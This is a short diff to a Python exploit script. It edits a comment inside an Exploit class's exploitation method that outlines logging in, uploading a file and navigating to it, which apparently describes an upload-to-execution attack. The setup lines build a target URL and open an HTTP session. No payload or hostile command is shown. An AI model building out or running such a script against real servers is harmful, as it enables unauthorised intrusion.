@@ -28,8 +28,7 @@ class Exploit:
 		self.password = password
 
 	def exploitation(self):
-		
-		#Login to the app (getting auth token)
+		#Login and sign in, followed by uploading a file and navigating to it.
 		url = "http://" + target_ip + ":" + target_port
 		r = requests.Session()
 		print("[*] Resolving URL...")
